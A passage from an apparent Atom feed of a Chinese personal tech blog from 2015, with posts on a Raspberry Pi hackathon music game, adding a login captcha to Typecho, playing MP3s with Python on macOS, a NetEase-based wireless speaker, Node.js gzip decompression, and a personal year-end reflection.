<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-08-raspberry-connect-to-arduion-by-serial"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-04-08-raspberry-connect-to-arduion-by-serial" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/">http://homeway.me/2015/04/08/raspberry-connect-to-arduion-by-serial/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-04-08 20:56:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[基于树莓派的体感音乐游戏]]></title>
      <url>http://homeway.me/2015/03/30/play-music-through-senses/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-raspberry-pi.png" alt="Raspberry-Pi"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-关于"><a href="#0x01-关于" class="headerlink" title="0x01.关于"></a>0x01.关于</h1><p>这是2015沪港黑客马拉松的获奖作品，获得了全场大奖，并获得香港参赛机会。</p>
<p>关于源码，已经上传到github上了。<a href="https://github.com/2015-hackathon/hackathon" target="_blank" rel="external">https://github.com/2015-hackathon/hackathon</a></p>
<p>作品通过超声波传感器检测距离，类似特雷门琴，通过距离变化弹奏音符，以此来弹奏游戏中的音符。</p>
<p>下面是关于作品几张图片：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-03-30-hackathon-1.jpg" alt="作品原型"></p>
<p><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog/2015-03-30-hackathon-2.jpg" alt="作品硬件端"></p>
<p><hr><br></p>
<p><img src="https://static.blog.homeway.me/blog/2015-03-30-hackathon-3.jpg" alt="作品硬件端"></p>
<p><hr><br></p>
<p>作品演示视频：</p>
<video src="https://static.blog.homeway.me/blog/play-music-through-senses-2.pm4.mp4" controls="controls"></video>

<p><br></p>
<p>比赛路演：</p>
<video src="https://static.blog.homeway.me/blog/play-music-through-senses-1.pm4.mp4" controls="controls"></video>


<p><hr><br></p>
<h1 id="0x02-作品原理"><a href="#0x02-作品原理" class="headerlink" title="0x02.作品原理"></a>0x02.作品原理</h1><h4 id="原理如下："><a href="#原理如下：" class="headerlink" title="原理如下："></a>原理如下：</h4><p>超声波测距获取超声波与手之间的距离（不同距离即模拟钢琴的不同按键），</p>
<p>通过socket发送给socket服务端sever，服务端转发数据给web客户端client，</p>
<p>web端client用当前符与超声波发送距离比对，检测是否正确，正确即加分。</p>
<p>另外，显示的超级玛丽视频是用于界面效果，与游戏无关。</p>
<p><br></p>
<h4 id="基本Socket流程图如下："><a href="#基本Socket流程图如下：" class="headerlink" title="基本Socket流程图如下："></a>基本Socket流程图如下：</h4><p><img src="https://static.blog.homeway.me/blog/2015-03-30-hackathon-4.png" alt="系统整体流程图"></p>
<p>服务器端socket使用php，树莓派端socket使用python，这里用到了一个pyhon的socket转websocket模块，模块在github上搜得到，<a href="https://github.com/GulDmitry/php-websocket-server" target="_blank" rel="external">https://github.com/GulDmitry/php-websocket-server</a>。</p>
<p><br></p>
<h4 id="关于前端音符编码"><a href="#关于前端音符编码" class="headerlink" title="关于前端音符编码"></a>关于前端音符编码</h4><p>发音模块使用的是underscorejs的库：<a href="http://underscorejs.org/" target="_blank" rel="external">http://underscorejs.org/</a></p>
<p>该库需要将音符转码，把音符声调、音长、音高低转成电子码，由于没有音乐知识，这部分浪费了队友3d很多时间。</p>
<p>1、do、re、mi、fa、so、la、xi、du，编码换算表如下：</p>
<pre><code>var NOTE_MAP_REVERSE = {//换算公式
    1: &#39;C&#39;,
    2: &#39;D&#39;,
    3: &#39;E&#39;,
    4: &#39;F&#39;,
    5: &#39;G&#39;,
    6: &#39;A&#39;,
    7: &#39;B&#39;
};
</code></pre><p>2、关于还有音高和音低，3、4、4等代表升调。</p>
<p>3、另外关于音长与音短，0.25、0.5代表半拍、一拍音长。</p>
<p>换算结果类似如下，一串数组：</p>
<pre><code>[[&quot;E4&quot;, 0.5], [&quot;E4&quot;, 0.5], [&quot;E4&quot;, 0.5], [&quot;C4&quot;, 0.25], [&quot;E5&quot;, 0.25], [&quot;G4&quot;, 0.5]]
</code></pre><p><hr><br></p>
<h1 id="0x03-关于本次hackathon"><a href="#0x03-关于本次hackathon" class="headerlink" title="0x03.关于本次hackathon"></a>0x03.关于本次hackathon</h1><p>这是我第五次参加hackathon了吧，每一次都能遇到很多很有能力的队友，在很短的时间内做了很多平时这么短时间内做不完的事情。</p>
<p>本次黑客马拉松很开心认识了两位好码友。</p>
<p>还是本着那个最初的想法，只做好玩的东西，只做有创意的东西。</p>
<p>下面是团队照片：</p>
<p><img src="https://static.blog.homeway.me/blog/2015-03-30-hackathon-6.jpg" alt="团队照片"></p>
<p><img src="https://static.blog.homeway.me/blog/2015-03-30-hackathon-5.jpg" alt="团队照片"></p>
<p><img src="https://static.blog.homeway.me/blog/2015-03-30-hackathon-7.jpg" alt="团队照片"></p>
<p>感谢团队每个人。</p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-30-play-music-through-senses"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-30-play-music-through-senses" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/03/30/play-music-through-senses/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/03/30/play-music-through-senses/">http://homeway.me/2015/03/30/play-music-through-senses/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-03-30 17:19:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Typecho添加验证码]]></title>
      <url>http://homeway.me/2015/03/25/add-check-code-for-typecho/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-typecho.png" alt="Typecho"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-关于"><a href="#0x01-关于" class="headerlink" title="0x01.关于"></a>0x01.关于</h1><p>写Typecho主题时候碰到的问题，在登录时候添加验证码。</p>
<p>Typecho有很好的路由机制，并且MVC模型模块化做的很好。</p>
<p>系统代码在<code>/var/</code>中，包括了：Widget工具，Typecho模型等。</p>
<p>开发者二次开发代码在<code>/usr/</code>中，主要放置Theme主题，Plugins插件等。</p>
<p>添加验证码不能用插件形式，因此只能直接在源码中更改。</p>
<p>这里说两种验证码方式，<a href="http://geetest.com/" target="_blank" rel="external">Geetest极验验证</a>，和用php生成图片两种方法。</p>
<p><hr><br></p>
<h1 id="0x02-Geetest极验"><a href="#0x02-Geetest极验" class="headerlink" title="0x02.Geetest极验"></a>0x02.Geetest极验</h1><p>这个简单，到<a href="http://geetest.com/" target="_blank" rel="external">http://geetest.com/</a>官网注册下账号。</p>
<p>1、按照极验的要求，修改前端代码，即，在/admin/login.php中添加代码。</p>
<p>2、添加Geetest插件，在<code>/var/Widget/</code>中添加Geetestlib.php</p>
<p>3、修改后台验证端，修改<code>/var/Widget/Login.php</code>如下：</p>
<pre><code>require_once(&#39;Geetestlib.php&#39;);
class Widget_Login extends Widget_Abstract_Users implements Widget_Interface_Do {
    public function action() {
        /*  此处...省略...字 */
        $captcha_id = &quot;...自己填&quot;;//TODO: replace it with your own captcha&#39;s id
        $private_key = &quot;...自己填&quot;;//TODO: replace it with your own captcha&#39;s key
        $geetestlib = new GeetestLib($captcha_id,$private_key);
        if (isset($_POST[&#39;geetest_challenge&#39;]) &amp;&amp; isset($_POST[&#39;geetest_validate&#39;]) &amp;&amp;    isset($_POST[&#39;geetest_seccode&#39;])) {
            $validate_response = $geetestlib-&gt;geetest_validate(@$_POST[&#39;geetest_challenge&#39;], @$_POST[&#39;geetest_validate&#39;], @$_POST[&#39;geetest_seccode&#39;]);
        }else{
            $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(&quot;use your own captcha validate &quot;);
            $this-&gt;response-&gt;goBack();
        }
        if ($validate_response == TRUE) {
        } else if ($validate_response == FALSE) {
            $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(&#39;请先验证&#39;);
            $this-&gt;response-&gt;goBack();
        }else{
            $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(&#39;FORBIDDEN&#39;);
            $this-&gt;response-&gt;goBack();
        }
         /*  此处...省略...字 */
 }
</code></pre><p>…部分代码，详细下载链接如下：</p>
<p><a href="/code/typecho-Login-1.php">http://homeway.me/code/typecho-Login-1.php</a></p>
<p><hr><br></p>
<h1 id="0x02-php生成图片"><a href="#0x02-php生成图片" class="headerlink" title="0x02.php生成图片"></a>0x02.php生成图片</h1><p>1、修改前端代码，修改<code>/admin/login.php</code>，添加如下：</p>
<pre><code>    &lt;p&gt;
           &lt;img style=&quot;cursor:pointer&quot; title=&quot;刷新验证码&quot; id=&quot;refresh&quot; border=&#39;0&#39; src=&#39;verify.php&#39; onclick=&quot;document.getElementById(&#39;refresh&#39;).src=&#39;typecho-code.php?t=&#39;+Math.random()&quot;/&gt;
    &lt;/p&gt;
    &lt;p&gt;
        &lt;label for=&quot;name&quot; class=&quot;sr-only&quot;&gt;&lt;?php _e(&#39;验证码&#39;); ?&gt;&lt;/label&gt;
           &lt;input type=&quot;text&quot; id=&quot;name&quot; name=&quot;verify&quot; value=&quot;&quot; placeholder=&quot;&lt;?php _e(&#39;验证码&#39;); ?&gt;&quot; class=&quot;text-l w-100&quot; /&gt;
    &lt;/p&gt;
</code></pre><p>2、添加php生成验证码的php插件，添加到<code>/admin/typecho-code.php</code>、<code>/admin/typecho-t1.ttf</code>，代码下载:</p>
<p><a href="/code/typecho-code.php">http://homeway.me/code/typecho-code.php</a></p>
<p><a href="/code/typecho-t1.ttf">http://homeway.me/code/typecho-t1.ttf</a></p>
<p>3、修改后台验证代码，修改<code>/var/Widget/Login.php</code>如下：</p>
<pre><code>session_start();
$flag=true;
class Widget_Login extends Widget_Abstract_Users implements Widget_Interface_Do {
    public function action() {
        /*  此处...省略...字 */
        if (strtolower($_POST[&#39;verify&#39;]) != strtolower($_SESSION[&#39;verify&#39;]) ) {
            /** 防止穷举,休眠3秒 */
            sleep(3);
            $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(_t(&#39;验证码错误！&#39;), &#39;error&#39;);
            $this-&gt;response-&gt;goBack(&#39;?referer=&#39; . urlencode($this-&gt;request-&gt;referer));
            $flag = false;
        }else{
            /** 如果验证码对了，开始验证用户 **/
            $valid = $this-&gt;user-&gt;login($this-&gt;request-&gt;name, $this-&gt;request-&gt;password,
            false, 1 == $this-&gt;request-&gt;remember ? $this-&gt;options-&gt;gmtTime + $this-&gt;options-&gt;timezone+30*24*3600 : 0);
            /** 比对密码 */
            if (!$valid) {
                /** 防止穷举,休眠3秒 */
                sleep(3);
                $this-&gt;pluginHandle()-&gt;loginFail($this-&gt;user, $this-&gt;request-&gt;name,
                $this-&gt;request-&gt;password, 1 == $this-&gt;request-&gt;remember);
                Typecho_Cookie::set(&#39;__typecho_remember_name&#39;, $this-&gt;request-&gt;name);
                $this-&gt;widget(&#39;Widget_Notice&#39;)-&gt;set(_t(&#39;用户名或密码无效&#39;), &#39;error&#39;);
                $this-&gt;response-&gt;goBack(&#39;?referer=&#39; . urlencode($this-&gt;request-&gt;referer));
            }
            $this-&gt;pluginHandle()-&gt;loginSucceed($this-&gt;user, $this-&gt;request-&gt;name,
            $this-&gt;request-&gt;password, 1 == $this-&gt;request-&gt;remember);
        }
        /*  此处...省略...字 */
    }
}
</code></pre><p>…部分代码，详细下载链接如下：</p>
<p><a href="/code/typecho-Login-2.php">http://homeway.me/code/typecho-Login-2.php</a></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-25-add-check-code-for-typecho"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-25-add-check-code-for-typecho" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/03/25/add-check-code-for-typecho/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/03/25/add-check-code-for-typecho/">http://homeway.me/2015/03/25/add-check-code-for-typecho/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-03-25 14:49:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[mac下用python播放mp3]]></title>
      <url>http://homeway.me/2015/03/17/play-mp3-under-mac-use-python/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-python.png" alt="Python"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-关于"><a href="#0x01-关于" class="headerlink" title="0x01.关于"></a>0x01.关于</h1><p>在做<a href="http://homeway.me/2015/03/15/netease-wireless-music-box/">《基于网易云音乐API的无线播放器》</a>的时候，想要适配各个环境，需要用Python在mac播放音乐。</p>
<p>Python在mac播放音乐坑比较多，所以记点笔记，希望以后开发或者读者能少踩点坑。</p>
<p>解决python播放的方案很多，而且各个看上去好像都很有效，其实，真的鞋下去，各种报错。</p>
<p><hr><br></p>
<h1 id="0x02-暂无方案"><a href="#0x02-暂无方案" class="headerlink" title="0x02.暂无方案"></a>0x02.暂无方案</h1><ul>
<li>用pygame模块</li>
</ul>
<p>一开始，我选择用pygame解决播放问题，测试代码很简单。</p>
<pre><code>import pygame,sys
pygame.init()
pygame.mixer.init()
pygame.time.delay(1000)
pygame.mixer.music.load(&quot;xxx.mp3&quot;)
pygame.mixer.music.play()
while 1:
    for event in pygame.event.get():
        if event.type==pygame.QUIT:
            sys.exit()
</code></pre><p>播放的时候就碰到坑了，爆了下面的错误。</p>
<blockquote>
<p>xxx.mp3 error! Module format not recognized</p>
</blockquote>
<p>想想，应该是，需要解压什么的，于是去查资料了。</p>
<ul>
<li>用pymedia模块</li>
</ul>
<p>在网上看到这么一篇文章 <a href="http://www.cnblogs.com/myqiao/archive/2011/08/07/2129777.html" target="_blank" rel="external">《用PyMedia解码并播放mp3文件》</a></p>
<p>看上去挺有道理的，然后就去找pymedia模块了。</p>
<p>安装完了，就一直报错。</p>
<ul>
<li>PyAudio模块</li>
</ul>
<p><a href="http://people.csail.mit.edu/hubert/pyaudio/" target="_blank" rel="external">http://people.csail.mit.edu/hubert/pyaudio/</a></p>
<p>用完后报错。</p>
<ul>
<li><p>pyglet模块</p>
<pre><code>  import pyglet
  music = pyglet.resource.media(&#39;music.mp3&#39;)
  music.play()
  pyglet.app.run()
</code></pre></li>
</ul>
<blockquote>
<p>‘AVbin is required to decode compressed media’)<br>pyglet.media.riff.WAVEFormatException: AVbin is required to decode compressed media</p>
</blockquote>
<p>于是就去下了AVbin模块，地址在这里：<a href="https://github.com/AVbin/AVbin/downloads" target="_blank" rel="external">https://github.com/AVbin/AVbin/downloads</a></p>
<p>嗯…….可以了。弄完就能播放了，然后，播放到10多秒突然停了。。。</p>
<p>现在还找不到解决方案，明天去了解下mp3文件格式，待续待续………</p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-15-play-mp3-under-mac-use-python"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-15-play-mp3-under-mac-use-python" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/03/15/play-mp3-under-mac-use-python/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/03/17/play-mp3-under-mac-use-python/">http://homeway.me/2015/03/15/play-mp3-under-mac-use-python/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-03-17 17:27:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[基于网易云音乐API的无线音箱]]></title>
      <url>http://homeway.me/2015/03/15/netease-wireless-music-box/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-raspberry-pi.png" alt="Raspberry-Pi"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-关于"><a href="#0x01-关于" class="headerlink" title="0x01.关于"></a>0x01.关于</h1><p>大一时候买了个音箱，低音蛮重的，效果挺不错的。</p>
<p>无聊的时候就闲想弄个无线音箱好了。</p>
<p>市面上的无线音箱都是基于蓝牙传输的，我就不凑热闹了，想想就用数据通信好了。</p>
<p>起初的想法是用树莓派做服务器，手机web端做客户端。</p>
<p>但是现在想想，只要把播放mp3的模块做下适配，处理好win、mac、linux兼容就可以直接把电脑当服务端了。</p>
<p>所以Demo版只支持树莓派，下个版本会适配所有环境。</p>
<p>关于源码，我已经上传到github上了。<a href="https://github.com/grasses/NetEase-Wireless-MusicBox" target="_blank" rel="external">https://github.com/grasses/NetEase-Wireless-MusicBox</a></p>
<p><hr><br></p>
<h1 id="0x02-效果演示"><a href="#0x02-效果演示" class="headerlink" title="0x02.效果演示"></a>0x02.效果演示</h1><p><img src="/image/2015-03-15-netease-wireless-music-box-01.jpg" alt="MusicBox"></p>
<p><br></p>
<p><img src="/image/2015-03-15-netease-wireless-music-box-02.jpg" alt="MusicBox"></p>
<p><br></p>
<p><img src="/image/2015-03-15-netease-wireless-music-box-03.jpg" alt="MusicBox"></p>
<p><br></p>
<video src="https://static.blog.homeway.me/@/blog/netease-wireless-music-box.mp4" controls="controls"></video>


<p><br><hr><br></p>
<h1 id="0x03-设备原理"><a href="#0x03-设备原理" class="headerlink" title="0x03.设备原理"></a>0x03.设备原理</h1><p><img src="/image/2015-03-15-netease-wireless-music-box-04.png" alt="MusicBox"></p>
<p>树莓派做服务器，手机web端作为客户端，两者必须在一个网段内。</p>
<p>服务器端使用Python的框架Tornado作为web访问，pygame模块负责播放音乐，所有音乐信息均采用网易云音乐API。</p>
<p>关于网易云音乐api是不开放的，用的是一位前辈写过的api改编，前辈api被网易封了，网易后来加了个csrf防护。</p>
<p><hr><br></p>
<h1 id="0x04-关于后记"><a href="#0x04-关于后记" class="headerlink" title="0x04.关于后记"></a>0x04.关于后记</h1><p>想说3点，就3点！！！</p>
<p>1、前端模块framwork7超级难用。</p>
<p>2、如1所述。</p>
<p>3、如2所述。</p>
<p>Framwork7这个鬼东西把所有事件都封在自己模块内部，又不留接口，只能按着它给的class name去添加。</p>
<p>要不是喜欢它的app模式的界面，早就不想用它了。</p>
<p>最后实在忍不住了，我就去改了内核源码。</p>
<p>所以，这里留了个坑。</p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-15-netease-wireless-music-box"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-15-netease-wireless-music-box" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/03/15/netease-wireless-music-box/"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/03/15/netease-wireless-music-box/">http://homeway.me/2015/03/15/netease-wireless-music-box/</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-03-15 15:27:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Nodejs关于gzip/deflate压缩]]></title>
      <url>http://homeway.me/2015/03/03/nodejs-gzip-deflate-compression/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-node.png" alt="NodeJs-Logo"></p>
<a id="more"></a>
<p><br><hr><br></p>
<h1 id="0x01-关于"><a href="#0x01-关于" class="headerlink" title="0x01.关于"></a>0x01.关于</h1><p>写http时候，在接收http请求时候，出现乱码，后来发现是gzip没有解压。</p>
<p>关于gzip/deflate压缩，有放入管道压缩，和非管道压缩方法。</p>
<p><br></p>
<h1 id="0x02-非管道压缩"><a href="#0x02-非管道压缩" class="headerlink" title="0x02.非管道压缩"></a>0x02.非管道压缩</h1><p>代码如下：</p>
<pre><code>#! /usr/local/bin/node

var http = require(&#39;http&#39;),
    querystring = require(&#39;querystring&#39;),
    zlib = require(&#39;zlib&#39;);
var args = {
    //参数以及备用数据
    contents : querystring.stringify({  
        //发包的信息
        name:&#39;homeway.me&#39;,
    }), 
};
var options = {
    hostname: &#39;homeway.me&#39;,
    port: 80,
    path: &#39;/&#39;,
        method: &#39;GET&#39;,
    headers: {
        &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;,
        &#39;Content-Length&#39;: args.contents.length,
        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.11 Safari/537.36&#39;,
        &#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;,
   },
};

var get = function ( options, args, callback ){
    var req = http.request(options, function (res) {
        var chunks =[], data, encoding = res.headers[&#39;content-encoding&#39;];
        // 非gzip/deflate要转成utf-8格式
        if( encoding === &#39;undefined&#39;){
            res.setEncoding(&#39;utf-8&#39;); 
        }
        res.on(&#39;data&#39;, function (chunk){
            chunks.push(chunk);
        }); 
        res.on(&#39;end&#39;, function (){
            var buffer = Buffer.concat(chunks);
            if (encoding == &#39;gzip&#39;) {
                zlib.gunzip(buffer, function (err, decoded) {
                        data = decoded.toString();
                    callback( err, args, res.headers, data); 
                });
            } else if (encoding == &#39;deflate&#39;) {
                zlib.inflate(buffer, function (err, decoded) {
                        data = decoded.toString();
                    callback( err, args, res.headers, data); 
                });
            } else {
                data = buffer.toString();
                callback( null, args, res.headers, data);
            } 
        });
    });
    req.write( args.contents ); 
    req.end();
};

get( options, args, function (err, args, headers, data){
    console.log(&#39;==&gt;header \n&#39;, headers);
    console.log(&#39;==data \n&#39;, data);
});
</code></pre><h1 id="0x02-管道压缩"><a href="#0x02-管道压缩" class="headerlink" title="0x02.管道压缩"></a>0x02.管道压缩</h1><p>Node中的I/O是异步的，因此对磁盘和网络的读写需要通过回调函数来读取数据。</p>
<p>当内存中无法一次装下需要处理的数据时，或者一边读取一边处理更加高效时，我们就需要用到数据流。</p>
<p>NodeJS中通过各种Stream来提供对数据流的操作。</p>
<p>官网提供了管道方法：</p>
<pre><code>// client request example
var zlib = require(&#39;zlib&#39;);
var http = require(&#39;http&#39;);
var fs = require(&#39;fs&#39;);
var request = http.get({ host: &#39;homeway.me&#39;,
                     path: &#39;/&#39;,
                     port: 80,
                     headers: { &#39;accept-encoding&#39;: &#39;gzip,deflate&#39; } });
request.on(&#39;response&#39;, function(response) {
      var output = fs.createWriteStream(&#39;izs.me_index.html&#39;);

      switch (response.headers[&#39;content-encoding&#39;]) {
        // or, just use zlib.createUnzip() to handle both cases
        case &#39;gzip&#39;:
              response.pipe(zlib.createGunzip()).pipe(output);
              break;
        case &#39;deflate&#39;:
              response.pipe(zlib.createInflate()).pipe(output);
              break;
        default:
              response.pipe(output);
              break;
      }
});
</code></pre><p><br></p>
<h4 id="引用来源："><a href="#引用来源：" class="headerlink" title="引用来源："></a>引用来源：</h4><p><a href="http://nodejs.org/api/zlib.html" target="_blank" rel="external">Node.js v0.12.0 Manual &amp; Documentation</a></p>
<p><br><hr><br></p>
<h4 id="本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-03-nodejs-gzip-deflate-compression"><a href="#本文出自-夏日小草-转载请注明出处：-http-homeway-me-2015-03-03-nodejs-gzip-deflate-compression" class="headerlink" title="本文出自 夏日小草,转载请注明出处： http://homeway.me/2015/03/03/nodejs-gzip-deflate-compression"></a>本文出自 <a href="http:/homeway.me" target="_blank" rel="external">夏日小草</a>,转载请注明出处： <a href="http://homeway.me/2015/03/03/nodejs-gzip-deflate-compression">http://homeway.me/2015/03/03/nodejs-gzip-deflate-compression</a></h4><h4 id="by-小草"><a href="#by-小草" class="headerlink" title="by 小草"></a>by 小草</h4><p>2015-03-03 14:17:20</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[再见2014，写下2015]]></title>
      <url>http://homeway.me/2015/01/05/goodbye-2014-hello-2015/</url>
      <content type="html"><![CDATA[<p><br></p>
<p><img src="https://static.blog.homeway.me/blog/logo-2015.jpg" alt="再见2014，写下2015"></p>
<a id="more"></a>
<p><br></p>
<h1 id="0x01-说点啥"><a href="#0x01-说点啥" class="headerlink" title="0x01.说点啥"></a>0x01.说点啥</h1><p>想想去年写年终总结也就是在不久前。</p>
<p>嗯…生命本身是一场修行的过程，我很喜欢一句话：念念不忘，必有回响。</p>
<p>也便是修行，我想，你该做的即是，一心向善，莫问前程。</p>
<p>2014好多想做的事情都体验过了，还有好多没有完成的梦。</p>
<p>关于2015的愿望，嗯…享受生活，努力修行，不问前程。</p>
<p><br><hr><br></p>
<h1 id="0x02-贴点图"><a href="#0x02-贴点图" class="headerlink" title="0x02.贴点图"></a>0x02.贴点图</h1><h3 id="情不知所起，一往而深"><a href="#情不知所起，一往而深" class="headerlink" title="情不知所起，一往而深"></a>情不知所起，一往而深</h3><p>2014一点一滴，感谢有你的陪伴，缠绵从来都只是一个美丽的词语。</p>
<p>如果要我开口，只能说一句话，让我成为你的有可能。</p>
<p><img src="/image/2015-01-04-hello-2015-0222.jpg" alt="情不知所起，一往而深"></p>
<p><br></p>
<h3 id="初探Hackthon"><a href="#初探Hackthon" class="headerlink" title="初探Hackthon"></a>初探Hackthon</h3><p>第一次知道这个东西，感觉蛮好玩的。</p>
<p>第一次参加这种类型的比赛，只能是走马观花赏风景。</p>
<p><img src="/image/2015-01-04-hello-2015-0328.jpg" alt="初生牛犊不怕虎"></p>
<p><br></p>
<h3 id="六月Hackthon"><a href="#六月Hackthon" class="headerlink" title="六月Hackthon"></a>六月Hackthon</h3><p>第二次参加hackthon，认识了一位好朋友，这是我最大的收获。</p>
<p>赢得了个bong手环。</p>
<p><img src="/image/2015-01-04-hello-2015-0601.png" alt="第二次Hackthon"></p>
<p><br></p>
<h3 id="入门硬件"><a href="#入门硬件" class="headerlink" title="入门硬件"></a>入门硬件</h3><p>一开始只是一时的兴趣晚安树莓派。</p>
<p>再到后来的传感器，以及后来接触的Bluetooth模块等等。</p>
<p>探索是一种勇敢，努力地去尝试未知的世界，看到更多的东西。</p>
<p><img src="/image/2015-01-04-hello-2015-0727.jpg" alt="入门硬件"></p>
<p>这个是在后期，开始玩很多乱七八糟的传感。</p>
<p>依然是那句话，念念不忘，必有回响，不必计较得得失失，只要玩得开心。</p>
<p><img src="/image/2015-01-04-hello-2015-1022.jpg" alt="很多传感器"></p>
<p><br></p>
<h3 id="八月北京"><a href="#八月北京" class="headerlink" title="八月北京"></a>八月北京</h3><p>以去HTML5峰会名义，第一次进京吧，难免有些激动。</p>
<p>嗯…北京有很多好吃的，好玩的，各种的各种风景区，娱乐场所。</p>
<p>只是我还是更喜欢去关注IT的状况，很可惜没去中关村。</p>
<p><img src="/image/2015-01-04-hello-2015-0816.jpg" alt="八月北京"></p>
<p><br></p>
<h3 id="在·觉·的日子"><a href="#在·觉·的日子" class="headerlink" title="在·觉·的日子"></a>在·觉·的日子</h3><p>嗯…觉的日子里见识了很多新的东西。</p>
<p>很喜欢的是一群人，简单，积极，努力地奋斗的样子。</p>
<p>这是我一直很喜欢的朋友圈，也是IT的朋友圈，没有太多的计较与抱怨。</p>
<p>念念不忘，必有回响，不必攻于心计。</p>
<p><img src="/image/2015-01-04-hello-2015-0901-1.jpg" alt="在·觉·的日子"></p>
<p><img src="/image/2015-01-04-hello-2015-0901-2.jpg" alt="在·觉·的日子"></p>
<p><br></p>
<h3 id="十月土豆会"><a href="#十月土豆会" class="headerlink" title="十月土豆会"></a>十月土豆会</h3><p>这是我玩得最开心的一次Hackthon。</p>
<p>产品是一个基于树莓派，用手触碰的flappy bird。</p>
<p>大概是自己的独乐其中，也忘了其他什么，什么奖也没有拿到。</p>
<p><img src="/image/2015-01-04-hello-2015-1012-1.jpg" alt="十月土豆会"></p>
<p>来得冲忙，被树姐拍到的照片。</p>
<p>我想，快乐是自己给自己的，去分享，去探索，去感受生活。</p>
<p><img src="/image/2014-11-08-403-1.jpg" alt="十月土豆会"></p>
<p><br> </p>
<h3 id="十一月南京"><a href="#十一月南京" class="headerlink" title="十一月南京"></a>十一月南京</h3><p>十一月在南京参加了，中兴云服务企业产品设计大赛。</p>
<p>十一月南京，天气有点凉，跑跑大街看看风景，见见老朋友，那种感觉，真的无法形容。</p>
<p><img src="/image/2015-01-04-hello-2015-1130.jpg" alt="十一月南京"></p>
<p>吃过的超级好吃的辛香汇。</p>
<p><img src="/image/2015-01-04-hello-2015-1131.jpg" alt="十一月南京"></p>
<p><br></p>
<h3 id="姑苏寒山寺"><a href="#姑苏寒山寺" class="headerlink" title="姑苏寒山寺"></a>姑苏寒山寺</h3><p>姑苏城外寒山寺，夜半钟声到客船。</p>
<p>听着寒山寺钟声，与老朋友一同欢聚，大概是跨年的最佳气氛吧。</p>
<p><img src="/image/2015-01-04-hello-2015-0101-1.jpg" alt="姑苏寒山寺"></p>
<p>山塘七里旧繁华，园客家家尽种花。</p>
<p><img src="/image/2015-01-04-hello-2015-0101-2.jpg" alt="姑苏寒山寺"></p>
<p><br><hr><br></p>
<h1 id="想想2015"><a href="#想想2015" class="headerlink" title="想想2015"></a>想想2015</h1><p>想想，嗯，有很多的梦想去实现，有很多的生活要去体验。</p>
<p>我想，记住那句话，一心向善，莫问前程。</p>
